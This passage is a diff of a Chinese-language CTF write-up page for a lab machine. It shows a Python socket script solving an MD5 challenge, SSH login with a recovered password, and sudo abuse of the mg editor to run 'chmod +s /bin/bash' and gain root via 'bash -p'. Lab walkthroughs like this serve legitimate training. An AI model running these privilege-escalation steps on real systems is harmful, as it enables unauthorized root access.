-md5_hash = hashlib.md5(param.encode()).hexdigest()
-s.send((md5_hash + "\n").encode())
+<span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>()
+<span class="pl-en">print</span>(<span class="pl-s1">data</span>)
+<span class="pl-s1">x</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r"MD5\((\d+) \+ UNIX timestamp: (\d+)\)"</span>, <span class="pl-s1">data</span>)
+<span class="pl-s1">param</span> <span class="pl-c1">=</span> <span class="pl-s1">x</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>) <span class="pl-c1">+</span> <span class="pl-s1">x</span>.<span class="pl-c1">group</span>(<span class="pl-c1">2</span>)
+<span class="pl-s1">md5_hash</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">md5</span>(<span class="pl-s1">param</span>.<span class="pl-c1">encode</span>()).<span class="pl-c1">hexdigest</span>()
+<span class="pl-s1">s</span>.<span class="pl-c1">send</span>((<span class="pl-s1">md5_hash</span> <span class="pl-c1">+</span> <span class="pl-s">"<span class="pl-cce">\n</span>"</span>).<span class="pl-c1">encode</span>())
 
-print(s.recv(4096).decode())
-s.close()
-</code></pre>
+<span class="pl-en">print</span>(<span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>())
+<span class="pl-s1">s</span>.<span class="pl-c1">close</span>()</pre></div>
 <p>成功通过所有挑战后，服务返回了一个密码。</p>
 <pre class="notranslate"><code class="notranslate">Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
 </code></pre>
 <p>这个密码<code class="notranslate">Wow!VeryFuuuuuny!</code>实际上是<code class="notranslate">peter</code>用户的SSH密码。使用该密码成功登录<code class="notranslate">peter</code>账户。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh peter@192.168.205.132
-peter@192.168.205.132's password: Wow!VeryFuuuuuny!
-...
-peter@Griffin:~$ id
-uid=1003(peter) gid=1003(peter) groups=1003(peter)
-</code></pre>
+peter@192.168.205.132<span class="pl-s"><span class="pl-pds">'</span>s password: Wow!VeryFuuuuuny!</span>
+<span class="pl-s">...</span>
+<span class="pl-s">peter@Griffin:~$ id</span>
+<span class="pl-s">uid=1003(peter) gid=1003(peter) groups=1003(peter)</span></pre></div>
 <h2><strong>3.5 Sudo提权 (peter -&gt; root)</strong></h2>
 <p>最后，检查<code class="notranslate">peter</code>用户的sudo权限。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">peter@Griffin:~$ sudo -l
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ sudo -l
 ...
 User peter may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/mg
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/mg</pre></div>
 <p><code class="notranslate">peter</code>可以免密以root权限运行文本编辑器<code class="notranslate">mg</code>。<code class="notranslate">mg</code>编辑器可以通过执行外部shell命令来进行提权。</p>
 <ol>
 <li>
 <p>创建一个脚本<code class="notranslate">/tmp/a</code>，内容为给<code class="notranslate">/bin/bash</code>添加SUID权限位，并赋予其执行权限。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">peter@Griffin:~$ echo 'chmod +s /bin/bash' &gt; /tmp/a
-peter@Griffin:~$ chmod +x /tmp/a
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/a
+peter@Griffin:<span class="pl-k">~</span>$ chmod +x /tmp/a</pre></div>
 </li>
 <li>
 <p>以sudo权限运行<code class="notranslate">mg</code>。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">peter@Griffin:~$ sudo /usr/bin/mg
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ sudo /usr/bin/mg</pre></div>
 </li>
 <li>
 <p>在<code class="notranslate">mg</code>编辑器中，按<code class="notranslate">Alt-x</code>，输入<code class="notranslate">shell-command</code>并按回车。</p>
@@ -1297,15 +392,13 @@ peter@Griffin:~$ chmod +x /tmp/a
 </li>
 </ol>
 <p>此时，<code class="notranslate">/bin/bash</code>已被设置了SUID位。使用<code class="notranslate">-p</code>参数运行bash以保留有效用户ID（euid）。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">peter@Griffin:~$ bash -p
+<div class="highlight highlight-source-shell"><pre class="notranslate">peter@Griffin:<span class="pl-k">~</span>$ bash -p
 bash-5.0# id
-uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)
-</code></pre>
+uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)</pre></div>
 <p>成功获得root权限。读取最终的flag。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">bash-5.0# cat /root/root.txt /home/lois/user.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash-5.0# cat /root/root.txt /home/lois/user.txt
 flag{root-be93b7d7f0a30d5159c0460874e6e015}
-flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
-</code></pre></div>
+flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
